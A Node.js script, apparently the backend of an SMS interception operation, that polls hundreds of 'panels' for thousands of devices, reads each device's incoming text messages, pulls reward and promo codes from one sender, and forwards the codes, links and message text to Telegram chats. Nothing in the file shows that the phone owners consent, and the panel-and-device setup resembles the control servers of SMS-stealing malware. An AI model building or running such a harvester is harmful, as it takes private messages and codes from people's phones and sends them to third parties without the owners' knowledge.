#!/usr/bin/env node
/**
 * Hybrid SMS Panel Monitor - Node.js Engine
 * 200+ Panels, 10,000+ Devices Supported
 * Desi Style 😆
 */

require('dotenv').config();
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const CONFIG = {
    globalConcurrency: parseInt(process.env.GLOBAL_CONCURRENCY) || 150,
    perPanelConcurrency: parseInt(process.env.PER_PANEL_CONCURRENCY) || 5,
    pollInterval: parseInt(process.env.POLL_INTERVAL) || 8,
    maxAgeMinutes: parseInt(process.env.MESSAGE_MAX_AGE_MINUTES) || 15,
    requestTimeout: parseInt(process.env.REQUEST_TIMEOUT) || 15,
    panelsPath: path.join(__dirname, '../data/panels.json'),
    dbPath: path.join(__dirname, '../data/monitor.db'),
    statusPath: path.join(__dirname, '../data/monitor_status.json'),
};

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || "").split(",").map(Number);
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const ALLOWED_SENDER = "BIGCITY";
const BLOCKED_TERMS = ["JK-IESOUS-S", "DIGICREDIT", "IESOUS"];

const db = new sqlite3.Database(CONFIG.dbPath);

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS processed_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        panel TEXT NOT NULL,
        device TEXT NOT NULL,
        message_id TEXT NOT NULL,
        sms_datetime TEXT,
        processed_at INTEGER,
        status TEXT,
        UNIQUE(panel, device, message_id)
    )`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_panel_device ON processed_messages(panel, device)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_processed_at ON processed_messages(processed_at)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_status ON processed_messages(status)`);
    db.run(`DELETE FROM processed_messages WHERE processed_at < datetime('now', '-7 days')`);
});

const dbGet = (sql, params = []) => new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => err ? reject(err) : resolve(row));
});

const dbAll = (sql, params = []) => new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => err ? reject(err) : resolve(rows));
});

const dbRun = (sql, params = []) => new Promise((resolve, reject) => {
    db.run(sql, params, function(err) {
        if (err) reject(err);
        else resolve({ lastID: this.lastID, changes: this.changes });
    });
});

const state = {
    panels: {},
    activePanels: new Map(),
    seenMessages: new Map(),
    panelFailures: new Map(),
    requestQueue: [],
    activeRequests: 0,
    panelActiveRequests: new Map(),
    running: true,
    metrics: {
        panels_total: 0,
        panels_active: 0,
        devices_total: 0,
        devices_online: 0,
        requests_total: 0,
        requests_failed: 0,
        messages_detected: 0,
        messages_sent: 0,
        messages_failed: 0,
        duplicates_ignored: 0,
        old_ignored: 0,
        filtered_ignored: 0,
        panel_status: {},
    }
};

class RequestPool {
    constructor() {
        this.concurrent = CONFIG.globalConcurrency;
        this.panelConcurrent = CONFIG.perPanelConcurrency;
        this.timeout = CONFIG.requestTimeout * 1000;
        this.queue = [];
        this.active = 0;
        this.panelActive = new Map();
    }

    async request(url, options = {}) {
        return new Promise((resolve, reject) => {
            this.queue.push({ url, options, resolve, reject });
            this.processQueue();
        });
    }

    processQueue() {
        if (this.queue.length === 0 || this.active >= this.concurrent) return;
        const task = this.queue.shift();
        const panel = task.options.panel || 'default';
        const panelCount = this.panelActive.get(panel) || 0;
        if (panelCount >= this.panelConcurrent) {
            this.queue.push(task);
            setTimeout(() => this.processQueue(), 100);
            return;
        }
        this.active++;
        this.panelActive.set(panel, panelCount + 1);
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), this.timeout);
        fetch(url, {
            ...task.options,
            signal: controller.signal,
            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', ...task.options.headers }
        })
        .then(res => { if (!res.ok) throw new Error(`HTTP ${res.status}`); return res.json(); })
        .then(data => {
            clearTimeout(timeoutId);
            this.active--;
            const count = this.panelActive.get(panel) || 0;
            this.panelActive.set(panel, Math.max(0, count - 1));
            state.metrics.requests_total++;
            task.resolve(data);
            this.processQueue();
        })
        .catch(err => {
            clearTimeout(timeoutId);
            this.active--;
            const count = this.panelActive.get(panel) || 0;
            this.panelActive.set(panel, Math.max(0, count - 1));
            state.metrics.requests_failed++;
            task.reject(err);
            this.processQueue();
        });
    }
}

class MessageTracker {
    async isProcessed(panel, device, messageId) {
        const row = await dbGet('SELECT id FROM processed_messages WHERE panel = ? AND device = ? AND message_id = ?', [panel, device, messageId]);
        return !!row;
    }
    async markProcessed(panel, device, messageId, datetime, status = 'sent') {
        await dbRun(`INSERT OR IGNORE INTO processed_messages (panel, device, message_id, sms_datetime, processed_at, status) VALUES (?, ?, ?, ?, ?, ?)`, [panel, device, messageId, datetime || '', Date.now(), status]);
    }
    async getBaseline(panel, device) {
        const rows = await dbAll('SELECT message_id FROM processed_messages WHERE panel = ? AND device = ?', [panel, device]);
        return new Set(rows.map(r => r.message_id));
    }
    async getBaselineAll(panel) {
        const rows = await dbAll('SELECT device, message_id FROM processed_messages WHERE panel = ?', [panel]);
        const map = new Map();
        for (const row of rows) {
            if (!map.has(row.device)) map.set(row.device, new Set());
            map.get(row.device).add(row.message_id);
        }
        return map;
    }
}

function formatPromoMessage(panelName, device, sender, message, datetime) {
    const original = String(message || "").trim();
    const combined = `${sender} ${original}`.toUpperCase();
    if (!combined.includes(ALLOWED_SENDER)) return null;
    for (const term of BLOCKED_TERMS) {
        if (combined.includes(term)) return null;
    }
    const promoContext = original.match(/(?:reward|promo|coupon|voucher|redemption)\s*(?:code|coupon)?/i);
    if (!promoContext) return null;
    const tail = original.substring(promoContext.index + promoContext[0].length, Math.min(promoContext.index + promoContext[0].length + 120, original.length));
    const promoMatch = tail.match(/\b[A-Z0-9]{8,24}\b/);
    if (!promoMatch) return null;
    const code = promoMatch[0];
    const redeemMatch = original.match(/https?:\/\/[^\s]+/i);
    let campaign = "";
    const campaignMatch = original.match(/(?:for|from)\s+(.{2,80}?)\s+(?:is|code|promo)\b/i);
    if (campaignMatch) { campaign = campaignMatch[1].trim(); }
    let txt = `🎁 <b>PROMO CODE RECEIVED</b>\n━━━━━━━━━━━━━━━━━━━\n`;
    if (campaign) txt += `🏷️ Campaign: <b>${campaign}</b>\n`;
    txt += `🎟️ Code: <code>${code}</code>\n`;
    if (redeemMatch) txt += `🔗 Redeem: ${redeemMatch[0]}\n`;
    txt += `👤 Sender: <code>${sender}</code>\n`;
    txt += `🔗 Panel: <b>${panelName}</b> | 📱 <code>${device.substring(0, 8)}</code>\n`;
    if (datetime) txt += `🕒 ${datetime}\n`;
    txt += `\n📝 <b>Message:</b>\n<code>${original.substring(0, 500)}</code>`;
    return txt;
}

class NotificationQueue {
    constructor() {
        this.queue = [];
        this.processing = false;
        this.lastSend = 0;
        this.minInterval = 100;
    }
    async add(panel, device, messageId, formatted, datetime) {
        this.queue.push({ panel, device, messageId, formatted, datetime });
        if (!this.processing) { this.process(); }
    }
    async process() {
        if (this.processing || this.queue.length === 0) return;
        this.processing = true;
        while (this.queue.length > 0) {
            const item = this.queue.shift();
            const now = Date.now();
            const wait = Math.max(0, this.minInterval - (now - this.lastSend));
            if (wait > 0) { await new Promise(r => setTimeout(r, wait)); }
            let success = true;
            for (const chatId of ADMIN_CHAT_IDS) {
                try {
                    const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: item.formatted, parse_mode: 'HTML', disable_web_page_preview: true })
                    });
                    if (!res.ok) { success = false; break; }
                } catch (e) { success = false; break; }
                this.lastSend = Date.now();
            }
            if (success) {
                state.metrics.messages_sent++;
                await tracker.markProcessed(item.panel, item.device, item.messageId, item.datetime, 'sent');
                console.log(`✅ Sent: ${item.panel}/${item.device}/${item.messageId}`);
            } else {
                state.metrics.messages_failed++;
                if (this.queue.length < 1000) { this.queue.push(item); await new Promise(r => setTimeout(r, 1000)); }
            }
        }
        this.processing = false;
    }
}

class PanelManager {
    constructor() {
        this.panels = {};
        this.loadPanels();
        this.watchPanels();
    }
    loadPanels() {
        try {
            if (fs.existsSync(CONFIG.panelsPath)) {
                const data = JSON.parse(fs.readFileSync(CONFIG.panelsPath, 'utf8'));
                this.panels = data;
                state.panels = data;
                state.metrics.panels_total = Object.keys(data).length;
                console.log(`📋 Loaded ${Object.keys(data).length} panels`);
            } else {
                this.panels = {};
                state.panels = {};
                console.log('📋 No panels found');
            }
        } catch (e) {
            console.log(`⚠️ Error loading panels: ${e.message}`);
            this.panels = {};
        }
    }
    watchPanels() {
        fs.watch(CONFIG.panelsPath, (eventType) => {
            if (eventType === 'change') {
                setTimeout(() => { this.loadPanels(); console.log('🔄 Panels reloaded'); }, 200);
            }
        });
        setInterval(() => {
            try {
                const updatePath = path.join(__dirname, '../data/panel_update.txt');
                if (fs.existsSync(updatePath)) {
                    const content = fs.readFileSync(updatePath, 'utf8').trim();
                    if (content) {
                        const parts = content.split('|');
                        if (parts[0] === 'ADD') {
                            console.log('🔄 Panel add detected, reloading');
                            this.loadPanels();
                        } else if (parts[0] === 'REMOVE') {
                            const name = parts[1];
                            if (this.panels[name]) {
                                delete this.panels[name];
                                state.panels = this.panels;
                                fs.writeFileSync(CONFIG.panelsPath, JSON.stringify(this.panels, null, 2));
                                console.log(`🗑️ Removed panel: ${name}`);
                            }
                        }
                        fs.writeFileSync(updatePath, '');
                    }
                }
            } catch (e) {}
        }, 2000);
    }
    getPanels() { return this.panels; }
}

class MonitorEngine {
    constructor(panelManager, requestPool, tracker, notificationQueue) {
        this.panelManager = panelManager;
        this.requestPool = requestPool;
        this.tracker = tracker;
        this.notificationQueue = notificationQueue;
        this.monitors = new Map();
        this.running = true;
        this.lastPoll = 0;
    }
    async start() {
        console.log('🚀 Starting monitor engine...');
        await this.establishBaseline();
        this.mainLoop();
        setInterval(() => this.updateStatus(), 5000);
    }
    async establishBaseline() {
        const panels = this.panelManager.getPanels();
        const names = Object.keys(panels);
        if (names.length === 0) return;
        console.log(`📊 Establishing baseline for ${names.length} panels...`);
        for (const name of names) {
            const panel = panels[name];
            const baseline = await this.tracker.getBaselineAll(name);
            if (baseline.size > 0) {
                this.monitors.set(name, { devices: baseline, lastCheck: 0, active: true });
                console.log(`  ✅ Baseline loaded for ${name}: ${baseline.size} devices`);
            }
        }
    }
    async mainLoop() {
        while (this.running) {
            try {
                const now = Date.now();
                if (now - this.lastPoll < CONFIG.pollInterval * 1000) {
                    await new Promise(r => setTimeout(r, 500));
                    continue;
                }
                this.lastPoll = now;
                const panels = this.panelManager.getPanels();
                const names = Object.keys(panels);
                if (names.length === 0) {
                    await new Promise(r => setTimeout(r, CONFIG.pollInterval * 1000));
                    continue;
                }
                state.metrics.panels_active = names.length;
                const promises = names.map(name => this.processPanel(name, panels[name]));
                await Promise.allSettled(promises);
            } catch (e) {
                console.log(`⚠️ Main loop error: ${e.message}`);
                await new Promise(r => setTimeout(r, 3000));
            }
        }
    }
    async processPanel(name, panel) {
        try {
            const startTime = Date.now();
            const { url, key } = panel;
            const auth = key ? `?auth=${key}` : '';
            let monitor = this.monitors.get(name);
            if (!monitor) {
                const baseline = await this.tracker.getBaselineAll(name);
                monitor = { devices: baseline, lastCheck: 0, active: true };
                this.monitors.set(name, monitor);
            }
            let clients;
            try {
                clients = await this.requestPool.request(`${url}/clients.json${auth}`, { panel: name, timeout: CONFIG.requestTimeout * 1000 });
            } catch (e) {
                const failures = state.panelFailures.get(name) || 0;
                state.panelFailures.set(name, failures + 1);
                if (failures > 10) {
                    console.log(`⚠️ Panel ${name} marked as inactive`);
                    state.metrics.panel_status[name] = { online: 0, total: 0, active: false };
                }
                return;
            }
            state.panelFailures.delete(name);
            if (!clients || typeof clients !== 'object') { return; }
            const deviceIds = Object.keys(clients);
            const onlineDevices = deviceIds.filter(id => { const info = clients[id]; return info && info.status === true; });
            state.metrics.panel_status[name] = { online: onlineDevices.length, total: deviceIds.length, active: true };
            state.metrics.devices_total += deviceIds.length;
            state.metrics.devices_online += onlineDevices.length;
            const devicePromises = onlineDevices.map(deviceId => this.processDevice(name, deviceId, panel, monitor));
            await Promise.allSettled(devicePromises);
            const duration = Date.now() - startTime;
            console.log(`✅ ${name}: ${onlineDevices.length}/${deviceIds.length} devices | ${duration}ms`);
        } catch (e) {
            console.log(`❌ Panel error ${name}: ${e.message}`);
        }
    }
    async processDevice(name, deviceId, panel, monitor) {
        try {
            const { url, key } = panel;
            const auth = key ? `?auth=${key}` : '';
            let baseline = monitor.devices.get(deviceId);
            if (!baseline) {
                baseline = await this.tracker.getBaseline(name, deviceId);
                monitor.devices.set(deviceId, baseline);
            }
            let messages;
            try {
                messages = await this.requestPool.request(`${url}/messages/${deviceId}.json${auth}`, { panel: name, timeout: CONFIG.requestTimeout * 1000 });
            } catch (e) { return; }
            if (!messages || typeof messages !== 'object') return;
            for (const [msgId, msgData] of Object.entries(messages)) {
                if (!msgData || typeof msgData !== 'object') continue;
                if (msgData.type !== 'incoming') continue;
                if (baseline.has(msgId)) { state.metrics.duplicates_ignored++; continue; }
                const smsTimeStr = msgData.dateTime || '';
                let smsTimestamp = 0;
                if (smsTimeStr) {
                    try {
                        const parts = smsTimeStr.split(' | ');
                        if (parts.length === 2) {
                            const dateParts = parts[0].split('-');
                            const timeParts = parts[1].split(' ');
                            const hm = timeParts[0].split(':');
                            let hours = parseInt(hm[0]);
                            const minutes = parseInt(hm[1]);
                            const ampm = timeParts[1] || '';
                            if (ampm.toUpperCase() === 'PM' && hours < 12) hours += 12;
                            if (ampm.toUpperCase() === 'AM' && hours === 12) hours = 0;
                            const date = new Date(parseInt(dateParts[2]), parseInt(dateParts[1]) - 1, parseInt(dateParts[0]), hours, minutes);
                            smsTimestamp = date.getTime();
                        }
                    } catch (e) {}
                }
                if (smsTimestamp === 0) {
                    await this.tracker.markProcessed(name, deviceId, msgId, smsTimeStr, 'invalid');
                    baseline.add(msgId);
                    continue;
                }
                const now = Date.now();
                const ageMinutes = (now - smsTimestamp) / (1000 * 60);
                if (ageMinutes > CONFIG.maxAgeMinutes) {
                    state.metrics.old_ignored++;
                    console.log(`  ⏰ ${deviceId}: ${msgId} - ${ageMinutes.toFixed(1)}m old (ignored)`);
                    await this.tracker.markProcessed(name, deviceId, msgId, smsTimeStr, 'old');
                    baseline.add(msgId);
                    continue;
                }
                const formatted = formatPromoMessage(name, deviceId, msgData.sender || '?', msgData.message || '', smsTimeStr);
                if (!formatted) {
                    state.metrics.filtered_ignored++;
                    await this.tracker.markProcessed(name, deviceId, msgId, smsTimeStr, 'filtered');
                    baseline.add(msgId);
                    continue;
                }
                state.metrics.messages_detected++;
                await this.notificationQueue.add(name, deviceId, msgId, formatted, smsTimeStr);
                baseline.add(msgId);
                console.log(`  📨 ${deviceId}: ${msgId} - ${ageMinutes.toFixed(1)}m old (sent)`);
            }
            if (baseline.size > 1000) {
                const arr = Array.from(baseline);
                const newSet = new Set(arr.slice(-500));
                monitor.devices.set(deviceId, newSet);
            }
        } catch (e) {
            console.log(`  ❌ ${deviceId}: ${e.message}`);
        }
    }
    async updateStatus() {
        const status = {
            timestamp: Date.now(),
            panels_total: state.metrics.panels_total,
            panels_active: state.metrics.panels_active,
            devices_total: state.metrics.devices_total,
            devices_online: state.metrics.devices_online,
            devices_offline: Math.max(0, state.metrics.devices_total - state.metrics.devices_online),
            messages_detected: state.metrics.messages_detected,
            messages_sent: state.metrics.messages_sent,
            messages_failed: state.metrics.messages_failed,
            duplicates_ignored: state.metrics.duplicates_ignored,
            old_ignored: state.metrics.old_ignored,
            filtered_ignored: state.metrics.filtered_ignored,
            requests_total: state.metrics.requests_total,
            requests_failed: state.metrics.requests_failed,
            panel_status: state.metrics.panel_status,
        };
        try { fs.writeFileSync(CONFIG.statusPath, JSON.stringify(status, null, 2)); } catch (e) {}
    }
}

const panelManager = new PanelManager();
const requestPool = new RequestPool();
const tracker = new MessageTracker();
const notificationQueue = new NotificationQueue();
global.tracker = tracker;
const engine = new MonitorEngine(panelManager, requestPool, tracker, notificationQueue);

async function start() {
    console.log('='.repeat(50));
    console.log('🏁 HYBRID SMS PANEL MONITOR - NODE.JS ENGINE');
    console.log('='.repeat(50));
    console.log(`🔧 Global Concurrency: ${CONFIG.globalConcurrency}`);
    console.log(`⏱️ Poll Interval: ${CONFIG.pollInterval}s`);
    console.log(`🕒 Max Age: ${CONFIG.maxAgeMinutes}m`);
    console.log('='.repeat(50));
    await engine.start();
    setInterval(() => {}, 60000);
}
start().catch(console.error);
process.on('SIGINT', () => { console.log('\n🛑 Shutting down...'); db.close(() => process.exit(0)); });
process.on('SIGTERM', () => { console.log('\n🛑 Shutting down...'); db.close(() => process.exit(0)); });
